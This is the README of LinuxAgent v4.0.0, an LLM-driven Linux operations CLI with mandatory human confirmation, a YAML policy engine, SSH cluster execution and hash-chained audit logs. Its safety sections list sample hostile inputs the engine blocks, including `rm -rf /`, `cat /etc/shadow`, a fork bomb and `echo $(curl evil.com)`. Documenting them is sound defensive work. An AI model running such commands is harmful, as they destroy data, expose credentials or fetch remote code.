<div align="center">
  <h1>LinuxAgent</h1>
  <img src="../../logo.jpg" alt="LinuxAgent Logo" width="320" />

  <p>
    <a href="https://github.com/Eilen6316/LinuxAgent.git"><img src="https://img.shields.io/badge/GitHub-Repository-black?style=flat-square&logo=github" alt="GitHub"></a>
    <a href="https://github.com/Eilen6316/LinuxAgent/actions/workflows/ci.yml"><img src="https://img.shields.io/github/actions/workflow/status/Eilen6316/LinuxAgent/ci.yml?branch=master&style=flat-square&label=CI" alt="CI"></a>
    <a href="https://github.com/Eilen6316/LinuxAgent/releases/tag/v4.0.0"><img src="https://img.shields.io/github/v/release/Eilen6316/LinuxAgent?style=flat-square" alt="Release"></a>
    <a href="https://github.com/Eilen6316/LinuxAgent/releases/tag/v4.0.0"><img src="https://img.shields.io/badge/package-GitHub%20Release-blue?style=flat-square" alt="GitHub Release package"></a>
    <a href="#development"><img src="https://img.shields.io/badge/coverage-87.06%25-brightgreen?style=flat-square" alt="Coverage"></a>
    <a href="../../SECURITY.md"><img src="https://img.shields.io/badge/security-policy-green?style=flat-square" alt="Security Policy"></a>
    <a href="https://gitcode.com/qq_69174109/LinuxAgent.git"><img src="https://img.shields.io/badge/GitCode-Repository-blue?style=flat-square&logo=git" alt="GitCode"></a>
    <a href="https://gitee.com/xinsai6316/LinuxAgent.git"><img src="https://img.shields.io/badge/Gitee-Repository-red?style=flat-square&logo=gitee" alt="Gitee"></a>
    <a href="http://qm.qq.com/cgi-bin/qm/qr?_wv=1027&k=o2ByKsl_gBN-fODJxH4Ps4Xboa_hCSI3&authKey=nVfsLJBin1CnZBd9pPNkxFk%2FGFqCe1FLsRMQmmxv%2FQnM78bC%2FjcWyMSeQcJDZC1U&noverify=0&group_code=281392454"><img src="https://img.shields.io/badge/QQ_Group-281392454-brightgreen?style=flat-square&logo=tencent-qq" alt="QQ Group"></a>
    <a href="https://blog.csdn.net/qq_69174109/article/details/146365413"><img src="https://img.shields.io/badge/CSDN-Project_Intro-blue?style=flat-square&logo=csdn" alt="CSDN"></a>
  </p>

  <p><em>LinuxAgent v4.0.0: LLM-driven Linux operations assistant CLI with mandatory Human-in-the-Loop safety</em></p>

  <p>
    <a href="../../README.md">Project homepage</a> ·
    <a href="../zh/README.md">简体中文</a>
  </p>
</div>

---

## What is LinuxAgent

**LinuxAgent** translates plain-language ops requests into Linux commands your team actually wants to run. Every LLM-generated command goes through token-level safety classification, every side-effecting action requires a human to press `y` in a terminal, and every decision is written to an append-only audit log.

Built on **LangGraph** for state-machine orchestration, **LangChain** for model abstraction, and **Pydantic v2** for fail-fast configuration. No local deep-learning stack is required.

**v4.0.0 is the first formal release of the rewritten agent.** It turns the earlier prototype into a policy-driven, audited, runbook-aware operations CLI for controlled operator-in-the-loop use, not unattended remediation.

### Who it's for

- Daily Linux ops: file inspection, log tailing, resource usage, service status
- SSH cluster operations: run one command across many hosts with automatic batch confirmation
- Interactive troubleshooting: let the model propose commands; you decide whether to run them
- Environments with audit requirements: every action appended to a local JSONL log

### Design principles

1. **The model is never trusted.** An LLM-generated command defaults to CONFIRM on its first appearance.
2. **Destructive commands are never permanently whitelisted.** `rm -rf`, `mkfs`, `systemctl stop`, etc. re-prompt every time.
3. **Batches must be explicit.** SSH to ≥2 hosts triggers a batch-confirmation flow by default.
4. **Decisions leave a trail.** Every approval, execution, and refusal is appended to `~/.linuxagent/audit.log`.
5. **No TTY means no silent execution.** CONFIRM requests in non-interactive contexts auto-deny.

---

## Core capabilities

| Capability | Notes |
|---|---|
| Natural language → command | Prompt + tool calling over OpenAI / DeepSeek / Anthropic Claude |
| Structured planning | LLM output is validated as JSON `CommandPlan` before any policy check or execution |
| File patch planning | Script, code, and config edits use structured `FilePatchPlan` output, unified-diff preview, and HITL approval |
| Read-only workspace tools | The planner can inspect real files through `read_file`, `list_dir`, and `search_files` before proposing a patch |
| Policy engine | `SAFE` / `CONFIRM` / `BLOCK` plus `risk_score`, `capabilities`, and audit-friendly `matched_rule` |
| Runbooks | 11 YAML runbooks supplied as planner guidance, not pre-LLM hard routes |
| Human-in-the-Loop | LangGraph `interrupt()` + session resume for controlled operator workflows |
| Session whitelist | Approved SAFE commands skip confirmation within the same process; destructive commands never enter |
| Cluster batch execution | SSH connection pool + concurrent fan-out + failure isolation, async wrapping paramiko |
| Audit log | JSONL append-only, `0o600`, never rotated, cannot be disabled |
| Monitoring alerts | CPU, memory, and root filesystem threshold alerts surfaced by `linuxagent check` |
| Intelligence modules | Usage stats, API-based semantic similarity, recommendations, knowledge base |
| Testability | Current documented baseline: 396 unit tests passing at 87.06% coverage, plus 12 HITL YAML scenarios, 8 integration smoke tests, and optional Anthropic compatibility verification |

---

## 30-second tour

```
you: find services listening on port 8080

 ┌─────────────────┐
 │  parse_intent   │   LLM proposes:  ss -tlnp sport = :8080
 └────────┬────────┘
          ▼
 ┌─────────────────┐
 │  safety_check   │   token-level classification → CONFIRM (LLM first-run)
 └────────┬────────┘
          ▼
 ┌─────────────────┐
 │     confirm     │   terminal shows a confirmation panel:
 │  (interrupt)    │     Command: ss -tlnp sport = :8080
 │                 │     Safety:  CONFIRM
 │                 │     Rule:    LLM_FIRST_RUN
 │                 │     Source:  llm
 │                 │   > Allow this operation? [y/N]
 └────────┬────────┘
          ▼ y
 ┌─────────────────┐
 │     execute     │   asyncio.create_subprocess_exec(*argv)
 └────────┬────────┘
          ▼
 ┌─────────────────┐
 │     analyze     │   LLM summarises raw output for an operator
 └────────┬────────┘
          ▼
        you ← "nginx (PID 4312) owns 8080, running as root"

 every step is appended to ~/.linuxagent/audit.log
```

Before command planning, an LLM-owned intent router chooses `DIRECT_ANSWER`,
`COMMAND_PLAN`, or `CLARIFY`. Conversational answers do not create a command
plan or confirmation panel. Operational methods are generated at runtime and
successful command patterns are stored in local learner memory after redaction;
Python code does not hard-code business or intent keyword rules. Deterministic
safety policy data is loaded from `configs/policy.default.yaml`.

---

## Full comparison with the original prototype

The earlier incarnation was a monolithic agent script. To make it production-fit for ops, the current release is a full rewrite across four dimensions: **algorithms, architecture, safety, and testing**.

### Architecture

| Aspect | Previous | Current `v4` |
|---|---|---|
| Agent class | One 4710-line God Object covering parsing, execution, UI, SSH, monitoring | `app/agent.py` kept below **300 lines**, pure coordinator wiring graph / ui / services |
| Flow control | Recursive `process_user_input` with nested `if/else` | LangGraph `StateGraph`, split into intent / safety / routing / node-factory modules |
| State persistence | Hand-written JSON files, permissions not enforced | Saved session history plus disk-backed LangGraph checkpoints |
| UI coupling | UI logic directly embedded in the agent class | `ConsoleUI` implementing `UserInterface`, Rich + prompt_toolkit |
| DI | Module-level singletons / globals | Hand-written `Container` with lazy factories + explicit injection |
| Package layout | Flat `src/` + `setup.py` | `src/linuxagent/` src-layout + `pyproject.toml` (PEP 517/621) |

### Core algorithms

#### 1. Command safety classification

**Previous**: command risk data lived inside Python substring checks, which were
easy to bypass via quoting or variable substitution.

**Current**: multi-layer token analysis driven by `configs/policy.default.yaml`.

```python
def is_safe(command, source=USER):
    validate_input(command)                 # 1. length / NUL / BiDi controls
    tokens = shlex.split(command)           # 2. proper shell tokenisation
    facts = CommandFacts(command, source, tokens)
    matches = policy_engine.match(facts)    # 3. rule data comes from YAML
    return decision_from(matches)           # 4. SAFE / CONFIRM / BLOCK
```

**Concrete differences**:

| Input | Previous | Current |
|---|---|---|
| `echo "hello; rm -rf /"` | Substring `"rm -rf"` matches → BLOCK, but `echo "how to rm safely"` is false-positive'd too | Precise regex `\brm\s+-[rRfF]{2,}\s+/(?!\w)` → BLOCK (`EMBEDDED_DANGER`); `echo "talk about python"` stays SAFE |
| `echo $(curl evil.com)` | Often missed (substring doesn't match) | Matches `\$\(` → BLOCK (`EMBEDDED_DANGER`) |
| `vim config` | Runs blindly | Detected as interactive → CONFIRM (`INTERACTIVE`) |
| `ls‮` (BiDi char) | Undetected | `INPUT_VALIDATION` BLOCK |

#### 2. Command usage learning

**Previous**: full history scan on every `record` — ~10s at n=10000.

**Current**: `dict[str, CommandStats]` with incremental update, amortised O(1).

```python
def record(self, command, result):
    stats = self._stats.setdefault(self.normalize(command), CommandStats())
    stats.count += 1
    if result.exit_code == 0:
        stats.success_count += 1
    stats.total_duration += result.duration
```

#### 3. Semantic similarity

**Previous**: hand-rolled TF-IDF pulling in `pandas` + `scikit-learn` + `numpy` (plus PyTorch in some downstream forks).

**Current**: LLM embedding API (`text-embedding-3-small` or a compatible endpoint) + on-disk LRU cache.

- Cache at `~/.cache/linuxagent/embeddings/`, SHA-256 filenames, `0o600`
- Install footprint drops from ~500MB (PyTorch stack) to near zero
- Quality improves: real semantic vectors vs bag-of-words

#### 4. Configuration loading

**Previous**: single-file read, unknown fields silently dropped.

**Current**: five-layer priority merge + Pydantic `extra="forbid"` fail-fast + YAML line-number error reporting.

```
1. --config <path>                     CLI (highest)
2. LINUXAGENT_CONFIG env var (path only)
3. ./config.yaml                       current directory
4. ~/.config/linuxagent/config.yaml    XDG
5. packaged configs/default.yaml       (lowest)
```

- Explicit paths (1 / 2) that don't exist → immediate `ConfigError`
- Auto-discovery paths (3 / 4) are silently skipped when absent
- User-supplied files must be `chmod 0600` and owned by the invoking user
- Validation errors include YAML line numbers: `api.timeout: Input should be valid at line 12`

#### 5. SSH host trust

**Previous**: `AutoAddPolicy` — silently accepts any host key on first contact, a trivial MITM path.

**Current**: `RejectPolicy` + `load_system_host_keys()`; unknown hosts raise `SSHUnknownHostError`.

```python
client.load_system_host_keys()
client.set_missing_host_key_policy(paramiko.RejectPolicy())
```

A CI red-line check `! grep -rn "AutoAddPolicy" src/linuxagent/` prevents accidental regression.

Remote execution is also narrower than local execution. Cluster commands are
accepted only as simple argv-like commands; shell sequencing, pipes,
redirects, command substitution, and variable expansion are blocked before
confirmation and again before SSH connection setup.

### Safety model

| Policy | Previous | Current `v4` |
|---|---|---|
| First model-generated command | runs directly | forced CONFIRM (`LLM_FIRST_RUN`) |
| Re-running an approved command | every run re-prompts | whitelisted within the session, cleared on exit |
| Destructive commands | string blacklist | token match + raw scan + subcommand regex, **never** whitelisted |
| Batch cluster operations | silent spread | hosts ≥ `cluster.batch_confirm_threshold` (default 2) forces CONFIRM; shell syntax is blocked before SSH |
| Non-interactive environment | can be bypassed | no-TTY confirm auto-returns `non_tty_auto_deny` |
| Audit trail | optional | hash-chained HITL events appended to `~/.linuxagent/audit.log` at `0o600`, verifiable with `linuxagent audit verify` |

### Testing and engineering

| Aspect | Previous | Current `v4` |
|---|---|---|
| Unit tests | 0 | **Current documented baseline: 396 passing; Anthropic compatibility can be verified when the extra is installed** |
| Coverage | 0 | **87.06%** (`--cov-fail-under=80` gate; defer to current CI / local `make test` output) |
| Static analysis | none | `ruff check` + `mypy --strict` + `bandit`, all clean |
| Red-line gates | none | CI greps `shell=True` / `AutoAddPolicy` / bare `except:` / `input(` in graph nodes |

Runtime policy overrides can be enabled in `config.yaml`:

```yaml
policy:
  path: ~/.config/linuxagent/policy.yaml
  include_builtin: true  # built-ins + user rule overrides/appends
```
| End-to-end scenarios | none | 12 YAML scenarios covering basic / dangerous / HITL / batch cluster / remote shell guard / runbook |
| Release flow | manual | tag-triggered GitHub Actions builds wheel + sdist + Release |

---

## Installation

### Automated (recommended)

```bash
git clone https://github.com/Eilen6316/LinuxAgent.git
cd LinuxAgent
./scripts/bootstrap.sh     # creates .venv + pip install -e ".[dev]" + seeds config.yaml(0600)
source .venv/bin/activate
```

### Manual

```bash
python3.11 -m venv .venv   # or python3.12
source .venv/bin/activate
pip install -e ".[dev]"
cp configs/example.yaml config.yaml
chmod 600 config.yaml      # required; the loader rejects user configs not at 0600
```

### Optional extras

```bash
pip install -e ".[anthropic]"     # Claude support
pip install -e ".[pyinstaller]"   # single-binary packaging
```

### Runtime requirements

- Python 3.11 or 3.12
- Linux (macOS works for development, Windows is not supported)
- For cluster mode: `~/.ssh/known_hosts` must already contain the target hosts

---

## Configuration

### Minimal working config

```yaml
# ./config.yaml (chmod 600)
api:
  api_key: "sk-replace-me"   # required
```

All other fields can stay at their defaults (default provider is DeepSeek; switch to `openai`, `openai_compatible`, `glm`, `qwen`, `kimi`, `minimax`, `gemini`, `hunyuan`, `anthropic`, `anthropic_compatible`, or `xiaomi_mimo` as needed).

For API relays or third-party OpenAI-compatible endpoints, use
`openai_compatible` or a provider shortcut such as `qwen`, `kimi`, `glm`,
`minimax`, `gemini`, or `hunyuan`:

```yaml
api:
  provider: openai_compatible
  base_url: https://relay.example.com/v1
  model: gpt-4o-mini
  api_key: "sk-replace-me"
  token_parameter: max_tokens
```

Anthropic-format relays can use `provider: anthropic_compatible` with their own
`base_url`; Xiaomi MiMo can use `provider: xiaomi_mimo`.

### Provider quick reference

| Provider | Protocol | Typical `base_url` | Token parameter |
|---|---|---|---|
| `deepseek` | OpenAI-compatible | `https://api.deepseek.com/v1` | `max_completion_tokens` |
| `openai` | OpenAI | `https://api.openai.com/v1` | `max_completion_tokens` |
| `openai_compatible` | OpenAI-compatible relay | Relay-specific `/v1` URL | Often `max_tokens` |
| `qwen` | OpenAI-compatible | `https://dashscope.aliyuncs.com/compatible-mode/v1` | `max_tokens` |
| `kimi` | OpenAI-compatible | `https://api.moonshot.ai/v1` | `max_tokens` |
| `glm` | OpenAI-compatible | `https://open.bigmodel.cn/api/paas/v4` | `max_tokens` |
| `minimax` | OpenAI-compatible | `https://api.minimax.io/v1` | `max_tokens` |
| `gemini` | OpenAI-compatible | `https://generativelanguage.googleapis.com/v1beta/openai/` | `max_tokens` |
| `hunyuan` | OpenAI-compatible | `https://api.hunyuan.cloud.tencent.com/v1` | `max_tokens` |
| `anthropic` | Anthropic | Provider default | n/a |
| `anthropic_compatible` | Anthropic-compatible relay | Relay-specific URL | n/a |
| `xiaomi_mimo` | Anthropic-compatible | Relay-specific URL | n/a |

### Validate

```bash
linuxagent check
# Sample output:
# OK: provider=deepseek, model=deepseek-chat,
#     batch_confirm_threshold=2, audit_log=/home/you/.linuxagent/audit.log
```

### Field reference

| Section | Field | Default | Description |
|---|---|---|---|
| `api` | `provider` | `deepseek` | `openai` / `openai_compatible` / `deepseek` / `glm` / `qwen` / `kimi` / `minimax` / `gemini` / `hunyuan` / `anthropic` / `anthropic_compatible` / `xiaomi_mimo` |
| `api` | `base_url` | `https://api.deepseek.com/v1` | OpenAI-compatible endpoint |
| `api` | `model` | `deepseek-chat` | Model name |
| `api` | `api_key` | `""` | **Required**; `SecretStr`, never printed |
| `api` | `token_parameter` | `max_completion_tokens` | Use `max_tokens` for API relays or older compatible backends |
| `api` | `timeout` | `30.0` | Per-request timeout (s) |
| `api` | `stream_timeout` | `60.0` | Overall stream timeout (s) |
| `api` | `max_retries` | `3` | Exponential-backoff retry attempts |
| `security` | `command_timeout` | `30.0` | Max local command runtime |
| `security` | `max_command_length` | `2048` | Per-command character cap |
| `security` | `session_whitelist_enabled` | `true` | Toggle the session whitelist |
| `file_patch` | `allow_roots` | `[".", "/tmp"]` | Roots where file patch tools may read and write |
| `file_patch` | `high_risk_roots` | `["/etc", "/root/.ssh", "/home/*/.ssh"]` | Matching paths are shown as elevated-risk patch confirmations |
| `file_patch` | `allow_permission_changes` | `true` | Allows patch plans to declare chmod-style permission changes |
| `file_patch` | `max_repair_attempts` | `2` | Automatic FilePatchPlan repair rounds; `0` disables patch repair |
| `cluster` | `batch_confirm_threshold` | `2` | Host count that triggers batch confirm |
| `cluster` | `hosts` | `[]` | Cluster host list |
| `audit` | `path` | `~/.linuxagent/audit.log` | Audit log location; **audit cannot be disabled** |
| `telemetry` | `exporter` | `local` | Local JSONL spans by default; `none` disables writes |
| `telemetry` | `path` | `~/.linuxagent/telemetry.jsonl` | Local telemetry path |
| `ui` | `theme` | `auto` | `auto` / `light` / `dark` |
| `ui` | `max_chat_history` | `20` | Max retained messages per saved session; new sessions do not load them automatically |
| `ui` | `checkpoint_path` | `~/.linuxagent/checkpoints.json` | Local LangGraph checkpoint store for pending HITL resume |
| `logging` | `level` | `INFO` | `DEBUG` / `INFO` / `WARNING` / ... |
| `logging` | `format` | `console` | `console` (Rich colour) / `json` (production) |
| `intelligence` | `embedding_model` | `text-embedding-3-small` | Semantic search model; **local PyTorch models are disallowed** |

Full example: [`configs/example.yaml`](../../configs/example.yaml).

---

## Usage tutorial

### Start the CLI

```bash
linuxagent
```

`linuxagent chat` remains available as an explicit equivalent.

You'll see a welcome panel followed by the prompt:

```
╭─────────────────────────────────────╮
│ LinuxAgent 2026 Ops Console         │
│ HITL-safe command automation with   │
│ audit trails                        │
╰─────────────────────────────────────╯

linuxagent ❯
```

Every CLI launch starts as a new conversation. Saved sessions are available
only through explicit slash commands. Typing `/` opens the command completion
menu:

| Slash command | Effect |
|---|---|
| `/resume` | Choose a locally saved session with arrow keys / mouse, or enter a number in non-interactive fallbacks; pending HITL confirmations resume immediately |
| `/new` or `/clear` | Start a fresh empty-context conversation in the same CLI |
| `/tools` | Show slash/tool entry points currently available |
| `/help` | Show slash command help |
| `/exit` or `/quit` | Exit the CLI |

Prefix input with `!` to run an operator-authored command directly:

```
linuxagent ❯ !git status
linuxagent ❯ !npm test
linuxagent ❯ !ls -la
```

For `!` turns, LinuxAgent does not ask the LLM to explain or generate a command.
It executes the command, streams output as it arrives, and adds both the
`!<command>` input and the system result to the current conversation context.

### File creation and editing

When you ask LinuxAgent to "create a shell script", "write a Python/Go program",
"edit a config file", or "add a feature to this existing file", it uses the file
patch workflow instead of asking the model to overwrite files through shell
redirection.

1. The planner can first inspect real context with read-only tools:
   `get_system_info`, `list_dir`, `read_file(path, offset, limit)`,
   `search_files(pattern, root)`, and `search_logs`.
2. The terminal shows observable tool activity such as `LinuxAgent is reading
   /tmp/disk_info.sh`; tool failures are surfaced clearly.
3. The model must return a structured `FilePatchPlan` with `request_intent`,
   target files, unified diff, risk summary, verification commands, and optional
   permission changes.
4. Before writing, LinuxAgent shows a diff confirmation panel with per-file
   `+N / -M` stats, compact code snippets, elevated-risk paths, permission
   changes, and verification commands.
5. Small diffs are not shown twice. Large diffs are paged, and extra review is
   requested only when hidden pages exist.
6. Multi-file patches can be accepted per file, so the operator can apply only
   the files they approve.

By default, patch reads and writes are limited to the current workspace and
`/tmp` through `file_patch.allow_roots`. Paths such as `/etc`, `/root/.ssh`, and
`/home/*/.ssh` are elevated risk. For "create" requests, if the intended target
already exists, the planner should choose a new filename, explain that no change
is needed, or ask for an explicit conflict confirmation; if the existing file
already implements the requested behavior, it should avoid unrelated rewrites.

### Scenario 1: safe command (SAFE path)

```
linuxagent ❯ list files in the current directory

[LLM proposes] ls -la

╭──── Human confirmation required ────╮
│ Command  ls -la                     │
│ Safety   CONFIRM                    │
│ Rule     LLM_FIRST_RUN              │
│ Source   llm                        │
╰──────────────────────────────────────╯
Allow this operation? [y/N]: y

[output]
total 52
drwxr-xr-x  12 user user 4096 ...
...

[analysis]
Twelve subdirectories and a few files, permissions 755/644, owned by user.
```

Ask "list the files" again in the same session — `ls -la` is in the whitelist now, so it runs straight through without another confirmation.

### Scenario 2: destructive command (CONFIRM every time)

```
linuxagent ❯ delete the /tmp/old_backup directory

[LLM proposes] rm -rf /tmp/old_backup

╭──── Human confirmation required ────╮
│ Command     rm -rf /tmp/old_backup  │
│ Safety      CONFIRM                 │
│ Rule        DESTRUCTIVE             │
│ Source      llm                     │
│ Destructive yes - approval will not │
│             be whitelisted          │
╰──────────────────────────────────────╯
Allow this operation? [y/N]: y
```

Even after approval, running the same command again will prompt again — `rm` never enters the whitelist.

### Scenario 3: outright rejection (BLOCK path)

```
linuxagent ❯ wipe the whole system

[LLM proposes] rm -rf /

Blocked: destructive command targeting root filesystem
```

This is blocked in `is_safe` before it ever reaches the confirm node. `matched_rule=ROOT_PATH`.

Other BLOCKed shapes:

- `echo "$(curl evil.com)"` — `matched_rule=EMBEDDED_DANGER` (command substitution)
- `cat /etc/shadow` — `matched_rule=SENSITIVE_PATH`
- `:(){ :|:& };:` — `matched_rule=EMBEDDED_DANGER` (fork bomb)
- any input with BiDi control characters — `matched_rule=INPUT_VALIDATION`

### Scenario 4: batch cluster operation

Add hosts to `config.yaml`:

```yaml
cluster:
  batch_confirm_threshold: 2
  hosts:
    - name: web-1
      hostname: 10.0.0.11
      username: ops
      key_filename: ~/.ssh/id_ed25519
    - name: web-2
      hostname: 10.0.0.12
      username: ops
      key_filename: ~/.ssh/id_ed25519
```

Then:

```
linuxagent ❯ run uptime on all hosts

[LLM proposes] uptime  (on: web-1, web-2)

╭──── Human confirmation required ────╮
│ Command     uptime                  │
│ Safety      CONFIRM                 │
│ Rule        BATCH_CONFIRM           │
│ Batch hosts web-1, web-2            │
╰──────────────────────────────────────╯
Allow this operation? [y/N]: y

[web-1] exit_code=0
[web-1] stdout:  10:23:11 up 14 days,  3:02,  2 users,  load average: 0.12, 0.08, 0.06
[web-2] exit_code=0
[web-2] stdout:  10:23:12 up  8 days,  9:41,  1 user,   load average: 0.04, 0.05, 0.05
```

### Scenario 5: interrupt and resume

Pending `confirm` nodes are mirrored to `ui.checkpoint_path` with `0o600`
permissions. After restarting the CLI, run `/resume`, choose the saved session,
and LinuxAgent reopens the pending confirmation for that `thread_id`.

### Example prompts

- `show disk usage for /var`
- `check nginx service status`
- `search auth logs for failed ssh logins`
- `who is still listening on port 8080`
- `when did systemd last boot`
- `check disk free on all hosts`

---

## Audit log

Each HITL event is appended as one hash-chained JSON line to `~/.linuxagent/audit.log`:

```json
{"ts": "2026-04-24T10:23:10.123+08:00", "event": "confirm_begin",
 "audit_id": "a1b2c3", "command": "uptime", "safety_level": "CONFIRM",
 "matched_rule": "BATCH_CONFIRM", "command_source": "llm",
 "trace_id": "t1", "batch_hosts": ["web-1", "web-2"],
 "prev_hash": "0000...", "hash": "9f86..."}
{"ts": "2026-04-24T10:23:14.456+08:00", "event": "confirm_decision",
 "audit_id": "a1b2c3", "decision": "yes", "latency_ms": 4333,
 "trace_id": "t1", "prev_hash": "9f86...", "hash": "3a6e..."}
{"ts": "2026-04-24T10:23:15.890+08:00", "event": "command_executed",
 "audit_id": "a1b2c3", "command": "uptime", "exit_code": 0,
 "duration_ms": 187, "trace_id": "t1", "batch_hosts": ["web-1", "web-2"],
 "prev_hash": "3a6e...", "hash": "b4c1..."}
```

Verify integrity:

```bash
linuxagent audit verify
```

Handy post-incident queries:

```bash
# Every approved decision
jq 'select(.event=="confirm_decision" and .decision=="yes")' ~/.linuxagent/audit.log

# Full trace for one HITL round
jq 'select(.audit_id=="a1b2c3")' ~/.linuxagent/audit.log

# Full trace across audit records
jq 'select(.trace_id=="t1")' ~/.linuxagent/audit.log

# Refused decisions
jq 'select(.event=="confirm_decision" and .decision!="yes")' ~/.linuxagent/audit.log
```

---

## FAQ

**Q: `linuxagent check` complains `must have permissions 0600`?**
A: R-SEC-04 requires user configs to be `0o600` and owned by the invoking user. Run `chmod 600 config.yaml`.

**Q: `linuxagent chat` raises `api.api_key is required`?**
A: Set a real value for `api.api_key` in `./config.yaml`.

**Q: Why was my command blocked?**
A: Look for `matched_rule` in stderr:

- `EMBEDDED_DANGER` — raw-string scan found a dangerous pattern (common with LLM payloads smuggled through echo)
- `SENSITIVE_PATH` — touched `/etc/shadow`, `/boot`, etc.
- `ROOT_PATH` — target is the root filesystem
- `INPUT_VALIDATION` — length / NUL / BiDi control character
- `PARSE_ERROR` — `shlex` refused to tokenise

**Q: Can `--yes` / `--no-confirm` skip every confirmation?**
A: Deliberately no. `--yes` only downgrades dialog-level confirmations; command-level CONFIRM / BLOCK are unaffected. Non-interactive callers hit `non_tty_auto_deny`.

**Q: Can I disable the audit log?**
A: No. `AuditConfig` exposes only `path`, with no `enabled` field.

**Q: How do I SSH in a fresh environment where `known_hosts` is empty?**
A: Pre-register host keys first, for example with `ssh-keyscan -H your-host.example.com >> ~/.ssh/known_hosts`. LinuxAgent always rejects unknown SSH host keys.

**Q: Can I use my own OpenAI-compatible gateway?**
A: Yes. Set `api.provider: openai_compatible`, point `api.base_url` to the gateway URL, and set `api.model` to a supported model. Shortcuts `glm`, `qwen`, `kimi`, `minimax`, `gemini`, and `hunyuan` use the same OpenAI-compatible path. If the gateway rejects `max_completion_tokens`, set `api.token_parameter: max_tokens`.

**Q: Can I use an Anthropic-compatible gateway?**
A: Yes. Install the Anthropic extra and set `api.provider: anthropic_compatible`, `api.base_url`, `api.model`, and `api.api_key`. Xiaomi MiMo can use `api.provider: xiaomi_mimo`.

---

## Development

```bash
make install   # pip install -e ".[dev]"
make test      # pytest + 80% fail-under; current documented baseline is listed above
make integration  # optional integration tests
make optional-anthropic  # optional Anthropic extra compatibility
make lint      # ruff check
make type      # mypy --strict
make security  # red-line grep + bandit
make harness   # YAML scenario harness
make build     # wheel + sdist
make verify-build  # build + wheel install + packaged data check
linuxagent audit verify
```

Details in [Development Guide](development.md).

---

## Release

```bash
python -m tests.harness.runner --scenarios tests/harness/scenarios
make integration  # optional, when local environment permits
make verify-build
git tag v4.0.0
git push origin v4.0.0     # triggers release.yml
```

See [Release Guide](release.md).

---

## Docs

- [Quick Start](quickstart.md)
- [Development Guide](development.md)
- [Release Guide](release.md) / [中文发布指南](../zh/release.md)
- [Migration Guide: v3 to v4.0.0](migration-v3-to-v4.md)
- [Threat Model](threat-model.md)
- [Production Readiness](production-readiness.md)
- [Release Notes](../releases/v4.0.0.md) / [中文发布说明](../zh/releases/v4.0.0.md)
- [Changelog](../../CHANGELOG.md) / [中文更新日志](../zh/CHANGELOG.md)
- [Security Policy](../../SECURITY.md) / [安全政策](../zh/SECURITY.md)
- [Contributing](../../CONTRIBUTING.md) / [贡献指南](../zh/CONTRIBUTING.md)
- [Code of Conduct](../../CODE_OF_CONDUCT.md) / [行为准则](../zh/CODE_OF_CONDUCT.md)

---

## License

MIT
